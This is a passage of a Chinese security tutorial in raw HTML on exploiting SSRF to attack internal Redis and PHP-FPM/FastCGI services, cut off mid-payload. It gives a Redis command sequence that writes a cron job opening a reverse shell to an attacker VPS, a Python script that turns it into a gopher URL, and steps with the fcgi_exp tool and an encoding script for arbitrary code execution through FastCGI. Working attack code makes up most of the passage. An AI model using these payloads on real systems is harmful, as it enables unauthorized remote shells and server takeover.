onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5g2TPYwEaazN42Tkhj5rxsDFa9hM6AbcsnEHH2FfBm8XfnmNbfib6iaAnw/640?wx_fmt=png'" data-type="png" data-w="507" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;width: 100%;height: auto;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">如下图，ssh连接成功：</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.5994130594277329" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/40_O9jHFawyOx96wibXZBJWVAk360f8OA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gtVQjLzJicosvhtxqVvibZ3QMfFAO9jHFawyOx96wibXZBJWVAk360f8OA/640?wx_fmt=png'" data-type="png" data-w="1363" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><h3 style="margin-top: 2rem;margin-bottom: 0.5rem;font-weight: 700;color: rgb(248, 95, 72);line-height: 1.35;font-size:20px;line-height:40px;;text-align: start;white-space: normal;font family: Menlo, Monaco, &quot;Source Code Pro&quot;, Consolas, Inconsolata, &quot;Ubuntu Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Courier New&quot;, &quot;Droid Sans Mono&quot;, &quot;Hiragino Sans GB&quot;, 微软雅黑, monospace !important;">创建计划任务反弹Shell</h3><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><strong style="color: rgb(0, 0, 0);">注意：这个只能在Centos上使用，别的不行，好像是由于权限的问题。</strong></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">构造redis的命令如下：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="cs"><code><span class="code-snippet_outer"><span class="code-snippet__keyword">set</span> <span class="code-snippet__number">1</span> <span class="code-snippet__string">'\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1\n\n'</span></span></code><code><span class="code-snippet_outer">config <span class="code-snippet__keyword">set</span> dir /<span class="code-snippet__keyword">var</span>/spool/cron/</span></code><code><span class="code-snippet_outer">config <span class="code-snippet__keyword">set</span> dbfilename root</span></code><code><span class="code-snippet_outer">save</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">// 47.xxx.xxx.72为攻击者vps的IP</span></span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">然后编写脚本，将其转化为Gopher协议的格式：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="makefile"><code><span class="code-snippet_outer">import urllib</span></code><code><span class="code-snippet_outer">protocol=<span class="code-snippet__string">"gopher://"</span></span></code><code><span class="code-snippet_outer">ip=<span class="code-snippet__string">"192.168.52.131"</span></span></code><code><span class="code-snippet_outer">port=<span class="code-snippet__string">"6379"</span></span></code><code><span class="code-snippet_outer">reverse_ip=<span class="code-snippet__string">"47.xxx.xxx.72"</span></span></code><code><span class="code-snippet_outer">reverse_port=<span class="code-snippet__string">"2333"</span></span></code><code><span class="code-snippet_outer">cron=<span class="code-snippet__string">"\n\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\n\n\n\n"</span>%(reverse_ip,reverse_port)</span></code><code><span class="code-snippet_outer">filename=<span class="code-snippet__string">"root"</span></span></code><code><span class="code-snippet_outer">path=<span class="code-snippet__string">"/var/spool/cron"</span></span></code><code><span class="code-snippet_outer">passwd=<span class="code-snippet__string">""</span></span></code><code><span class="code-snippet_outer">cmd=[<span class="code-snippet__string">"flushall"</span>,</span></code><code><span class="code-snippet_outer">   <span class="code-snippet__string">"set 1 {}"</span>.format(cron.replace(<span class="code-snippet__string">" "</span>,<span class="code-snippet__string">"${IFS}"</span>)),</span></code><code><span class="code-snippet_outer">   <span class="code-snippet__string">"config set dir {}"</span>.format(path),</span></code><code><span class="code-snippet_outer">   <span class="code-snippet__string">"config set dbfilename {}"</span>.format(filename),</span></code><code><span class="code-snippet_outer">   <span class="code-snippet__string">"save"</span></span></code><code><span class="code-snippet_outer">   ]</span></code><code><span class="code-snippet_outer">if passwd:</span></code><code><span class="code-snippet_outer">  cmd.insert(0,<span class="code-snippet__string">"AUTH {}"</span>.format(passwd))</span></code><code><span class="code-snippet_outer">payload=protocol+ip+<span class="code-snippet__string">":"</span>+port+<span class="code-snippet__string">"/_"</span></span></code><code><span class="code-snippet_outer">def redis_format(arr):</span></code><code><span class="code-snippet_outer">  CRLF=<span class="code-snippet__string">"\r\n"</span></span></code><code><span class="code-snippet_outer">  redis_arr = arr.split(<span class="code-snippet__string">" "</span>)</span></code><code><span class="code-snippet_outer">  cmd=<span class="code-snippet__string">""</span></span></code><code><span class="code-snippet_outer">  cmd+=<span class="code-snippet__string">"*"</span>+str(len(redis_arr))</span></code><code><span class="code-snippet_outer">  for x in redis_arr:</span></code><code><span class="code-snippet_outer">    cmd+=CRLF+<span class="code-snippet__string">"$"</span>+str(len((x.replace(<span class="code-snippet__string">"${IFS}"</span>,<span class="code-snippet__string">" "</span>))))+CRLF+x.replace(<span class="code-snippet__string">"${IFS}"</span>,<span class="code-snippet__string">" "</span>)</span></code><code><span class="code-snippet_outer">  cmd+=CRLF</span></code><code><span class="code-snippet_outer">  return cmd</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">if __name__==<span class="code-snippet__string">"__main__"</span>:</span></code><code><span class="code-snippet_outer">  for x in cmd:</span></code><code><span class="code-snippet_outer">    payload += urllib.quote(redis_format(x))</span></code><code><span class="code-snippet_outer">  print payload</span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">生成的payload同样进行url二次编码，然后利用Ubuntu服务器上的SSRF打过去，即可在目标主机192.168.52.131上写入计划任务，等到时间后，攻击者vps上就会获得目标主机的shell：</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.2550251256281407" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/41_RpPnB3HUfmQAch94UMxX1gJ3v6JMIQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gSicueJjEVkxmWDgSVwldvJNeRRpPnB3HUfmQAch94UMxX1gJ3v6JMIQ/640?wx_fmt=png'" data-type="png" data-w="796" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">[GKCTF2020]EZ三剑客-EzWeb 这道题利用的就是攻击内网Redis的思路。</p><h2 style="margin-top: 2rem;margin-bottom: 0.5rem;font-weight: 700;color: rgb(248, 95, 72);line-height: 1.35;font-size:24px;line-height:44px;;text-align: start;white-space: normal;font family: Menlo, Monaco, &quot;Source Code Pro&quot;, Consolas, Inconsolata, &quot;Ubuntu Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Courier New&quot;, &quot;Droid Sans Mono&quot;, &quot;Hiragino Sans GB&quot;, 微软雅黑, monospace !important;">攻击内网FastCGI</h2><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">FastCGI指快速通用网关接口（Fast Common Gateway Interface／FastCGI）是一种让交互程序与Web服务器通信的协议。FastCGI是早期通用网关接口（CGI）的增强版本。FastCGI致力于减少网页服务器与CGI程序之间交互的开销，从而使服务器可以同时处理更多的网页请求。</p><blockquote style="margin-bottom: 1.2em;padding: 15px 15px 15px 1rem;color: rgb(129, 145, 152);border-left-width: 6px;border-left-color: rgb(96, 125, 139);font-size:14px;line-height:34px;;line-height: 22px;background: rgb(242, 247, 251);text-align: start;white-space: normal;"><p style="margin-bottom: 15px;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);">众所周知，在网站分类中存在一种分类就是静态网站和动态网站，两者的区别就是静态网站只需要<strong style="color: rgb(0, 0, 0);">通过浏览器进行解析</strong>，而动态网站需要一个<strong style="color: rgb(0, 0, 0);">额外的编译解析</strong>的过程。以Apache为例，当访问动态网站的主页时，根据容器的配置文件，它知道这个页面不是静态页面，Web容器就会把这个请求进行简单的处理，然后如果使用的是CGI，就会启动CGI程序（对应的就是PHP解释器）。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定CGI规定的格式返回处理后的结果，退出进程，Web server再把结果返回给浏览器。这就是一个完整的动态PHP Web访问流程。</p><p style="margin-top: 15px;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);">这里说的是使用CGI，而FastCGI就相当于高性能的CGI，与CGI不同的是它<strong style="color: rgb(0, 0, 0);">像一个常驻的CGI</strong>，在启动后会一直运行着，不需要每次处理数据时都启动一次，<strong style="color: rgb(0, 0, 0);">所以FastCGI的主要行为是将CGI解释器进程保持在内存中</strong>，并因此获得较高的性能 。</p></blockquote><h3 style="margin-top: 2rem;margin-bottom: 0.5rem;font-weight: 700;color: rgb(248, 95, 72);line-height: 1.35;font-size:20px;line-height:40px;;text-align: start;white-space: normal;font family: Menlo, Monaco, &quot;Source Code Pro&quot;, Consolas, Inconsolata, &quot;Ubuntu Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Courier New&quot;, &quot;Droid Sans Mono&quot;, &quot;Hiragino Sans GB&quot;, 微软雅黑, monospace !important;">php-fpm</h3><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">FPM（FastCGI 进程管理器）可以说是FastCGI的一个具体实现，用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">攻击FastCGI的主要原理就是，在设置环境变量实际请求中会出现一个 <code style="background: rgb(243, 241, 241);color: rgb(88, 88, 88);font-size:16px;line-height:36px;;line-height: 18px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">SCRIPT_FILENAME</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">': '</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">/</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">var</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">/</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">www</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">/</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">html</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">/</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">index</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">.</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">php</span></code> 这样的键值对，它的意思是php-fpm会执行这个文件，但是这样即使能够控制这个键值对的值，但也只能控制php-fpm去执行某个已经存在的文件，不能够实现一些恶意代码的执行。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">而在PHP 5.3.9后来的版本中，PHP增加了安全选项导致只能控制php-fpm执行一些php、php4这样的文件，这也增大了攻击的难度。但是好在PHP允许通过PHPADMINVALUE和PHP_VALUE去动态修改PHP的设置。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">那么当设置PHP环境变量为：<code style="background: rgb(243, 241, 241);color: rgb(88, 88, 88);font-size:16px;line-height:36px;;line-height: 18px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">auto_prepend_file</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">=</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">php</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">:</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">//input;allow_url_include = On</span></code> 时，就会在执行PHP脚本之前包含环境变量 <code style="background: rgb(243, 241, 241);color: rgb(88, 88, 88);font-size:16px;line-height:36px;;line-height: 18px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">auto_prepend_file</span></code> 所指向的文件内容， <code style="background: rgb(243, 241, 241);color: rgb(88, 88, 88);font-size:16px;line-height:36px;;line-height: 18px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">php</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">:</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">//input</span></code> 也就是接收POST的内容，这个我们可以在FastCGI协议的body控制为恶意代码，这样就在理论上实现了php-fpm任意代码执行的攻击。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">详情请见：《SSRF系列之攻击FastCGI》</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">测试环境：</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.6160830090791181" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/42_0rlpib86Da0eZl6U0L1mLC6OBVMOZw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gJEsBYLUWxjFMwg8y64meB3aBQ0rlpib86Da0eZl6U0L1mLC6OBVMOZw/640?wx_fmt=png'" data-type="png" data-w="771" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">WEB服务器Ubuntu（192.168.43.166）存在SSRF漏洞：</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.4491750931346461" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/43_yYiamhJ9LtCHDm8actic9XE1fQ9ouw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gCChOVFNNBPPWD4EfAEnzumj1YPyYiamhJ9LtCHDm8actic9XE1fQ9ouw/640?wx_fmt=png'" data-type="png" data-w="1879" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">并且WEB服务器Ubuntu上存在FastCGI，那么我们就可以利用其SSRF漏洞去攻击其本地的FastCGI。</p><blockquote style="margin-bottom: 1.2em;padding: 15px 15px 15px 1rem;color: rgb(129, 145, 152);border-left-width: 6px;border-left-color: rgb(96, 125, 139);font-size:14px;line-height:34px;;line-height: 22px;background: rgb(242, 247, 251);text-align: start;white-space: normal;"><p style="margin-bottom: 15px;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);">假设在配置fpm时，将监听的地址设为了0.0.0.0:9000，那么就会产生php-fpm未授权访问漏洞，此时攻击者可以无需利用SSRF从服务器本地访问的特性，直接与服务器9000端口上的php-fpm进行通信，进而可以用fcgi_exp等工具去攻击服务器上的php-fpm实现任意代码执行。</p><p style="margin-top: 15px;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);">当内网中的其他主机上配置有fpm，且监听的地址为0.0.0.0:9000时，那么这台主机就可能存在php-fpm未授权访问漏洞，我们便可以利用Ubuntu服务器上的SSRF去攻击他，如果内网中的这台主机不存在php-fpm未授权访问漏洞，那么就直接利用Ubuntu服务器上的SSRF去攻击他显然是不行的。</p></blockquote><h3 style="margin-top: 2rem;margin-bottom: 0.5rem;font-weight: 700;color: rgb(248, 95, 72);line-height: 1.35;font-size:20px;line-height:40px;;text-align: start;white-space: normal;font family: Menlo, Monaco, &quot;Source Code Pro&quot;, Consolas, Inconsolata, &quot;Ubuntu Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Courier New&quot;, &quot;Droid Sans Mono&quot;, &quot;Hiragino Sans GB&quot;, 微软雅黑, monospace !important;">使用fcgi_exp工具攻击</h3><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">下载地址：https://github.com/piaca/fcgi_exp</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">这个工具主要是用来攻击未授权访问php-fpm的，可用来测试是否可以直接攻击php-fpm，但需要自己将生成的payload进行转换一下。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">该工具需要go语言环境，下载后进入目录执行如下命令进行编译：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="go"><code><span class="code-snippet_outer"><span class="code-snippet__keyword">go</span> build fcgi_exp.<span class="code-snippet__keyword">go</span>                    # 编译fcgi_exp.<span class="code-snippet__keyword">go</span></span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">编译完成后，我们在攻击机上使用 <code style="background: rgb(243, 241, 241);color: rgb(88, 88, 88);font-size:16px;line-height:36px;;line-height: 18px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">nc</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">-</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">lvvp</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">2333</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;"></span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">&gt;</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">fcg_exp</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">.</span><span style="background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;display: inline-block;padding-right: 2px;padding-left: 2px;font-size:14px;line-height:34px;;">txt</span></code> 监听2333 端口来接收fcgi_exp生成的payload，另外再开启一个终端使用下面的命令来向2333端口发送payload：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="javascript"><code><span class="code-snippet_outer">./fcgi_exp system <span class="code-snippet__number">127.0</span><span class="code-snippet__number">.0</span><span class="code-snippet__number">.1</span> <span class="code-snippet__number">2333</span> /<span class="code-snippet__keyword">var</span>/www/html/index.php <span class="code-snippet__string">"id"</span></span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.35756972111553786" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/44_mtrSpDgaQ1384XnLIV9Uod4P2eufFQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gsAJY6b1hhr5jAibYhaNnDDB7smtrSpDgaQ1384XnLIV9Uod4P2eufFQ/640?wx_fmt=png'" data-type="png" data-w="1004" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">生成的fcg_exp.txt文件的内容是接收到的payload，内容如下：</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.7023977433004231" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/45_DGvBG3kC0PcTd7BnINSFRx3kgOyGCA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gJCsqC7HwecyE6fpKdAEsjwFTDGvBG3kC0PcTd7BnINSFRx3kgOyGCA/640?wx_fmt=png'" data-type="png" data-w="709" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">然后对fcg_exp.txt文件里的payload进行url编码，这里通过如下脚本实现（脚本是我从网上白嫖的嘿嘿）：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="perl"><code><span class="code-snippet_outer"><span class="code-snippet__comment"># -*- coding: UTF-8 -*-</span></span></code><code><span class="code-snippet_outer">from urllib.parse import quote, unquote, urlencode</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">file = <span class="code-snippet__keyword">open</span>(<span class="code-snippet__string">'fcg_exp.txt'</span>,<span class="code-snippet__string">'r'</span>)</span></code><code><span class="code-snippet_outer">payload = file.read()</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">print</span>(<span class="code-snippet__string">"gopher://127.0.0.1:9000/_"</span>+quote(payload).replace(<span class="code-snippet__string">"%0A"</span>,<span class="code-snippet__string">"%0D"</span>).replace(<span class="code-snippet__string">"%2F"</span>,<span class="code-snippet__string">"/"</span>))</span></code></pre></section><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">执行上面的python脚本生成如下payload：</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.14270941054808686" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/46_llC6WIzFociaqyqsJPby58EyN9XdgQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5g4IgCTTpFIuuJHKIiapOZe6wW5wllC6WIzFociaqyqsJPby58EyN9XdgQ/640?wx_fmt=png'" data-type="png" data-w="967" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">这里还要对上面的payload进行二次url编码，然后将最终的payload内容放到?url=后面发送过去：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="apache"><code><span class="code-snippet_outer"><span class="code-snippet__attribute">ssrf</span>.php?url=gopher<span class="code-snippet__number">%3</span>A<span class="code-snippet__number">%2</span>F<span class="code-snippet__number">%2</span>F127.0.0.1<span class="code-snippet__number">%3</span>A9000<span class="code-snippet__number">%2</span>F_<span 